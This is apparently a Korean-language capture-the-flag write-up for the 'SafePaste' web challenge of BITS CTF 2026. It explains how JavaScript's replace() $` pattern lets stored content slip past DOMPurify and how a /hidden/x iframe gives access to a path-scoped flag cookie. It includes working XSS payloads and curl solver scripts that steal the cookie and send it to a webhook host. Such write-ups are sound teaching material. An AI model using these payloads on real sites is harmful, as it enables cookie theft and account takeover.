---
title: "[Web] SafePaste"
description: Writing about the "SafePaste" of BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# SafePaste (BITS CTF 2026)
---
- Name : SafePaste
- Category : Web
- Description : Yet another paste challenge?
- Difficulty : ★★★
---

## TL;DR
1. **mXSS**: `isomorphic-dompurify`의 네임스페이스 뮤테이션 취약점(`<p id="$`...`)을 이용해 XSS를 트리거  
2. **Socket Drop & Cookie Path Bypass**: `/hidden` 경로 직접 호출 시
   발생하는 소켓 파괴(Socket Destroy) 방어 로직을 피하기 위해,  
   하위 경로인 `/hidden/x` (404 Not Found)를 `iframe`으로 로드하여 `/hidden` 경로의 쿠키를 탈취   
4. **Unicode Error Bypass**: 플래그에 포함된 이모지(🥀)로 인한 `btoa()` 인코딩 에러(`InvalidCharacterError`)를  
   `encodeURIComponent()`를 사용하여 우회  
6. **Domain Match**: 봇을 호출할 때 쿠키 도메인(`APP_HOST`) 조건에 맞추어 `localhost`가 아닌 실제 공인 IP를 타겟 URL로 전송  

---

## Overview

**SafePaste**는 사용자의 입력을 DOMPurify로 검증한 후 저장하고,   
관리자(Bot)에게 해당 URL을 신고(Report)하여 방문하게 만드는 전형적인 Client-Side (XSS) 웹 문제입니다.  

목표는 봇의 브라우저에 저장된 `FLAG` 쿠키를 탈취하는 것입니다.   
하지만 쿠키는 `path: "/hidden"`, `domain: APP_HOST` 조건으로 엄격하게 구워져 있으며,   
서버에는 최신 브라우저의 보안 정책과 교묘한 방어 로직(소켓 강제 종료 및 이모지 함정)들이 겹겹이 적용되어 있습니다.  

---

## Solution

### 1) Recon

소스 코드에서 파악한 주요 엔드포인트와 방어 로직
* **`/create` & `/paste/:id`**: 사용자의 입력을 받아 `isomorphic-dompurify`로 치환(Sanitize) 후 HTML로 렌더링합니다.  
* **`/report`**: URL을 전달받아 관리자 봇(Puppeteer)을 호출합니다.  
  이때 URL의 호스트네임이 `APP_HOST` 이거나 `localhost`여야만 통과시킵니다.  
* **Bot Cookie**: 봇은 방문 전 플래그 쿠키를 `domain: APP_HOST`, `path: "/hidden"`으로 설정합니다.  
* **`/hidden` 엔드포인트 방어 로직**:
  ```typescript
  app.get("/hidden", (req, res) => {
    if (req.query.secret === ADMIN_SECRET) return res.send("Welcome, admin!");
    res.socket?.destroy(); // 시크릿이 없으면 소켓을 강제로 끊어버림
  });

---

### 2) Root Cause

#### 취약점 1: JavaScript `replace()`의 `$` 패턴

JavaScript의 `String.prototype.replace()`는 두 번째 인자(replacement string)에서 특수 패턴을 처리  

| 패턴 | 의미 |
|------|------|
| `$$` | `$` 문자 |
| `$&` | 매칭된 부분 전체 |
| **`` $` ``** | **매칭 이전의 모든 문자열** |
| `$'` | 매칭 이후의 모든 문자열 |

paste 템플릿이 다음과 같을 때:

```html
<!-- paste.html (앞부분 요약) -->
<!DOCTYPE html>
<html lang="en">
<head>...</head>
<body>
  <div class="content">{paste}</div>  <!-- replace 대상 -->
</body>
</html>
```

content에 `` $` `` 가 포함되면 `{paste}` 자리에 **`{paste}` 이전의 전체 HTML**이 삽입

```javascript
// content = '<p id="$`<img onerror=XSS>">'
template.replace("{paste}", content)

// 결과: id 속성에 template 앞부분이 삽입되면서
// 템플릿의 첫 번째 " 가 id 속성을 닫아버림!
// → <img onerror=XSS> 가 HTML context로 탈출
```

**실제 결과:**
```html
<div class="content">
  <p id="<!DOCTYPE html>
  <html lang="en">   ← id 속성 안에 삽입됨
    ...
    <div class="content"><img src=x onerror=PAYLOAD>  ← HTML context 탈출!
```

#### 취약점 2: `path=/hidden` 쿠키 접근

`history.pushState(null, '', '/hidden')`로 URL만 바꿔도   
Chrome은 실제 document URL 기준으로 cookie scope를 유지하므로 `document.cookie`로 FLAG 쿠키를 읽을 수 없습니다.

**해결: `iframe src="/hidden/x"`**

- `/hidden/x`는 존재하지 않는 404 경로지만 정상적으로 로드됨
- path가 `/hidden/x`이면 `/hidden` 쿠키의 scope에 포함됨
- 같은 origin이므로 `iframe.contentDocument.cookie`로 접근 가능!

```
/hidden   → 시크릿 없으면 res.socket.destroy() → iframe onload 안 fires!
/hidden/x → 404지만 정상 HTTP 응답 → iframe onload fires + path=/hidden 쿠키 접근 가능
```

---

### 3) Exploit

#### Step 1: DOMPurify가 통과시키는 payload 확인

```bash
# DOMPurify는 id 속성 내의 특수 문자를 안전하다고 판단
# 저장된 결과:
# <p id="</noscript><script>alert(1)</script>"></p>
# → id 속성값으로 저장되어 실제로는 무해해 보임
```

#### Step 2: `` $` `` 트릭으로 HTML context 탈출

```bash
# id 속성값 안에 `` $` `` 를 포함시키면:
# template.replace("{paste}", '<p id="$`<img onerror=XSS>">')
# → template 앞부분의 첫 " 가 id를 닫고 <img onerror=XSS> 가 HTML로 파싱됨
```

#### Step 3: FLAG 탈취 JavaScript 작성

```javascript
// iframe으로 /hidden/x 로드 → path=/hidden 쿠키 접근
var i = document.createElement('iframe');
i.src = '/hidden/x';
document.body.appendChild(i);
setTimeout(function() {
  var c = i.contentDocument.cookie;  // FLAG=BITSCTF{...} 접근!
  location.href = 'WEBHOOK_URL?c=' + encodeURIComponent(c);
}, 2000);
```

#### Step 4: 최종 Exploit 스크립트

```bash
WEBHOOK="https://ojaucwj.request.dreamhack.games"

JS="var i=document.createElement('iframe');i.src='/hidden/x';document.body.appendChild(i);setTimeout(()=>{var c=i.contentDocument.cookie;location.href='${WEBHOOK}?c='+encodeURIComponent(c);},2000);"
B64=$(echo -n "$JS" | base64 -w 0)

# 악성 paste 생성 ($` 트릭 + DOMPurify bypass)
PASTE_ID=$(curl -sX POST http://20.193.149.152:3000/create \
  --data-urlencode "content=<p id=\"\$\`<img src=x onerror=eval(atob(\`${B64}\`))>\">" \
  -D - -o /dev/null | grep -i location | tr -d '\r' | awk '{print $2}' | cut -d'/' -f3)

echo "Paste: $PASTE_ID"

# 봇에게 신고 (공인 IP로 report → 봇이 방문 → XSS 실행)
curl -sX POST http://20.193.149.152:3000/report \
  --data-urlencode "url=http://20.193.149.152:3000/paste/$PASTE_ID"
```

---

### 4) Why it works

#### 공격 체인 전체 흐름

```
[공격자]
    │
    ├─ 1. POST /create (악성 payload)
    │      └─ DOMPurify.sanitize() 통과
    │         └─ <p id="$`<img onerror=eval(atob(...))>"> 저장
    │
    ├─ 2. GET /paste/:id
    │      └─ template.replace("{paste}", stored_content)
    │         └─ $` 패턴 → template 앞부분 삽입 → id 닫힘
    │            └─ <img src=x onerror=...> HTML context 노출
    │
    ├─ 3. POST /report (url=http://...paste/:id)
    │      └─ 봇이 URL 방문
    │         └─ headless Chrome이 XSS 실행
    │
    └─ 4. XSS 실행
           ├─ iframe src="/hidden/x" 로드 (404지만 정상 응답)
           ├─ path=/hidden 쿠키가 iframe에 포함됨
           ├─ contentDocument.cookie = "FLAG=BITSCTF{...}"
           └─ document.location → webhook exfiltration
```

#### 각 우회 포인트

| 보호 수단 | 우회 방법 |
|-----------|-----------|
| DOMPurify sanitize | `id` 속성값 안에 숨겨서 통과 |
| template inject | JS `replace()`의 `` $` `` 패턴으로 HTML context 탈출 |
| `path=/hidden` 쿠키 | `iframe src="/hidden/x"` (하위 경로는 상위 path 쿠키 포함) |
| `document.cookie` scope | iframe의 `contentDocument.cookie`로 우회 |
| CSP `default-src 'self'` | `document.location` redirect는 navigation이므로 허용 |
| `/hidden` 소켓 파괴 | `/hidden/x` (404)는 소켓 파괴 없이 정상 로드 |

---

## Solver

```
# 1. 공격 데이터를 받을 Webhook 주소 세팅
WEBHOOK="webhook url" # 웹훅 url
TARGET_IP="20.193.149.152"

# 2. XSS Payload (iframe 404 트릭 + encodeURIComponent 적용)
JS="var i=document.createElement('iframe');i.src='/hidden/x';document.body.appendChild(i);setTimeout(()=>{try{var c=i.contentDocument.cookie;location.href='${WEBHOOK}?c='+encodeURIComponent(c);}catch(e){location.href='${WEBHOOK}?e='+encodeURIComponent(e.name);}}, 2000);"
B64=$(echo -n "$JS" | base64 -w 0)

# 3. DOMPurify mXSS를 이용한 악성 Paste 생성
PASTE_ID=$(curl -sX POST http://$TARGET_IP:3000/create \
  --data-urlencode "content=<p id=\"\$\`<img src=x onerror=eval(atob(\`${B64}\`))>\">" \
  -D - -o /dev/null | grep -i location | tr -d '\r' | awk '{print $2}' | cut -d'/' -f3)

echo "생성된 Paste ID: $PASTE_ID"

# 4. 봇에게 '공인 IP' 주소로 방문하라고 Report 전송 (APP_HOST 도메인 일치)
curl -i -X POST http://$TARGET_IP:3000/report \
  --data-urlencode "url=http://$TARGET_IP:3000/paste/$PASTE_ID"
```

---
<img width="1706" height="550" alt="스크린샷 2026-02-22 062123" src="https://github.com/user-attachments/assets/618c879e-12fe-4745-87c0-2a9dcfa9af52" />
<img width="1190" height="302" alt="스크린샷 2026-02-22 171852" src="https://github.com/user-attachments/assets/ac7e7406-2f3c-40e4-96d1-ef75bbfa9c55" />
---

**Flag:** `BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}`

---
